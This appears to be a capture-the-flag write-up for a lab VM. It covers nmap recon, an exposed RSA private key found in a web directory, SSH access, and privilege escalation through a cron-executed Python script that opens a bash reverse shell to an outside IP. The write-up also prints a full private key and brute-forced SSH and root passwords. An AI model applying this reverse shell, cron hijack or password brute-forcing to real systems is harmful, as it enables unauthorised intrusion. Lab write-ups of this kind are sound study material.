# Export
```bash
export IP="192.168.81.49"
export URL="http://192.168.81.49/FUZZ"
```

<hr>

# Credentials
+ SSH: `hadi:hadi123`

<hr>

# Initial foothold
```bash
$ ssh -i martin.rsa martin@$IP                                         
The authenticity of host '192.168.81.49 (192.168.81.49)' can't be established.
ECDSA key fingerprint is SHA256:YGvYXYw8dQn8xgGpWP4AlYshhJ6D4SqY71chPOERGwE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.81.49' (ECDSA) to the list of known hosts.

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

READY TO ACCESS THE SECRET LAB ? 

secret password : secret
WELCOME ! 
martin@debian:~$ id
uid=1001(martin) gid=1001(martin) groups=1001(martin)
```

<hr>

# Privilege Escalation

+`crontab`
```bash
martin@debian:/tmp$ cat /etc/crontab
...
*/5   * * * *   jimmy   python /tmp/sekurity.py
```

+ `sekurity.py`

```bash
martin@debian:/tmp$ cat sekurity.py 
import os

os.system("bash -c 'bash -i >& /dev/tcp/192.168.49.81/80 0>&1'")
```

+ After a few minutes

```bash
$ nc -nlvp 80                                                                                                                                                                           1 ⨯
listening on [any] 80 ...
connect to [192.168.49.81] from (UNKNOWN) [192.168.81.49] 57104
bash: cannot set terminal process group (7855): Inappropriate ioctl for device
bash: no job control in this shell
jimmy@debian:~$ id
id
uid=1002(jimmy) gid=1002(jimmy) groups=1002(jimmy)
```

+ `suid` binary

```bash
jimmy@debian:~$ ls -al
ls -al
total 28
drwx------ 2 jimmy jimmy 4096 Jun  9  2017 .
drwxr-xr-x 5 root  root  4096 Jun  9  2017 ..
-rw-r--r-- 1 root  root     0 Mar  6  2020 .bash_history
-rw-r--r-- 1 jimmy jimmy  220 Jun  8  2017 .bash_logout
-rw-r--r-- 1 jimmy jimmy 3515 Jun  8  2017 .bashrc
-rw-r--r-- 1 jimmy jimmy  675 Jun  8  2017 .profile
-rwsrwxrwx 1 root  root  7496 Jun  9  2017 networker
```

+ Bruteforce `SSH` credentials, we found the password for user `hadi`
is `hadi123`, which is also the `root` password.


<hr>

# Nmap
```bash
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.10 ((Debian))
| http-methods:                      
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 2 disallowed entries 
|_/wordpress-blog /files                    
|_http-server-header: Apache/2.4.10 (Debian)                          
|_http-title:  Secretsec Company                                                               
111/tcp   open  rpcbind syn-ack ttl 63 2-4 (RPC #100000)            
| rpcinfo: 
|   program version    port/proto  service 
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          37163/udp   status
|   100024  1          37475/udp6  status
|   100024  1          44532/tcp   status
|_  100024  1          60170/tcp6  status
44532/tcp open  status  syn-ack ttl 63 1 (RPC #100024)
```

<hr>

# Web Application

+ Email: `martin@secretsec.com`
+ `robots.txt`

```bash
$ curl http://192.168.81.49/robots.txt
User-agent: *
Disallow: /wordpress-blog
Disallow: /files
```

+ `icons`

```bash
$ curl -s http://secretsec.com/icons/ | html2text | head -10
****** Index of /icons ******
[[ICO]]       Name              Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                     -  
[[   ]]       README            2017-06-07 22:29 5.0K  
[[TXT]]       README.html       2017-06-07 22:29  35K  
[[TXT]]       VDSoyuAXiO.txt    2017-06-07 22:34 1.6K  
[[IMG]]       a.gif             2017-06-07 22:29  246  
[[IMG]]       a.png             2017-06-07 22:29  306  
[[IMG]]       alert.black.gif   2017-06-07 22:29  242 
```

+ `id_rsa` key

```bash
$ curl -s http://secretsec.com/icons/VDSoyuAXiO.txt         

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAoNgGGOyEpn/txphuS2pDA1i2nvRxn6s8DO58QcSsY+/Nm6wC
tprVUPb+fmkKvOf5ntACY7c/5fM4y83+UWPG0l90WrjdaTCPaGAHjEpZYKt0lEc0
FiQkXTvJS4faYHNah/mEvhldgTc59jeX4di0f660mJjF31SA9UgMLQReKd5GKtUx
5m+sQq6L+VyA2/6GD/T3qx35AT4argdk1NZ9ONmj1ZcIp0evVJvUul34zuJZ5mDv
DZuLRR6QpcMLJRGEFZ4qwkMZn7NavEmfX1Yka6mu9iwxkY6iT45YA1C4p7NEi5yI
/P6kDxMfCVELAUaU8fcPolkZ6xLdS6yyThZHHwIDAQABAoIBAAZ+clCTTA/E3n7E
LL/SvH3oGQd16xh9O2FyR4YIQMWQKwb7/OgOfEpWjpPf/dT+sK9eypnoDiZkmYhw
+rGii6Z2wCXhjN7wXPnj1qotXkpu4bgS3+F8+BLjlQ79ny2Busf+pQNf1syexDJS
sEkoDLGTBiubD3Ii4UoF7KfsozihdmQY5qud2c4iE0ioayo2m9XIDreJEB20Q5Ta
lV0G03unv/v7OK3g8dAQHrBR9MXuYiorcwxLAe+Gm1h4XanMKDYM5/jW4JO2ITAn
kPducC9chbM4NqB3ryNCD4YEgx8zWGDt0wjgyfnsF4fiYEI6tqAwWoB0tdqJFXAy
FlQJfYECgYEAz1bFCpGBCApF1k/oaQAyy5tir5NQpttCc0L2U1kiJWNmJSHk/tTX
4+ly0CBUzDkkedY1tVYK7TuH7/tOjh8M1BLa+g+Csb/OWLuMKmpoqyaejmoKkLnB
WVGkcdIulfsW7DWVMS/zA8ixJpt7bvY7Y142gkurxqjLMz5s/xT9geECgYEAxpfC
fGvogWRYUY07OLE/b7oMVOdBQsmlnaKVybuKf3RjeCYhbiRSzKz05NM/1Cqf359l
Wdznq4fkIvr6khliuj8GuCwv6wKn9+nViS18s1bG6Z5UJYSRJRpviCS+9BGShG1s
KOf1fAWNwRcn1UKtdQVvaLBX9kIwcmTBrl+e6P8CgYAtz24Zt6xaqmpjv6QKDxEq
C1rykAnx0+AKt3DVWYxB1oRrD+IYq85HfPzxHzOdK8LzaHDVb/1aDR0r2MqyfAnJ
kaDwPx0RSN++mzGM7ZXSuuWtcaCD+YbOxUsgGuBQIvodlnkwNPfsjhsV/KR5D85v
VhGVGEML0Z+T4ucSNQEOAQKBgQCHedfvUR3Xx0CIwbP4xNHlwiHPecMHcNBObS+J
4ypkMF37BOghXx4tCoA16fbNIhbWUsKtPwm79oQnaNeu+ypiq8RFt78orzMu6JIH
dsRvA2/Gx3/X6Eur6BDV61to3OP6+zqh3TuWU6OUadt+nHIANqj93e7jy9uI7jtC
XXDmuQKBgHZAE6GTq47k4sbFbWqldS79yhjjLloj0VUhValZyAP6XV8JTiAg9CYR
2o1pyGm7j7wfhIZNBP/wwJSC2/NLV6rQeH7Zj8nFv69RcRX56LrQZjFAWWsa/C43
rlJ7dOFH7OFQbGp51ub88M1VOiXR6/fU8OMOkXfi1KkETj/xp6t+
-----END RSA PRIVATE KEY-----
```
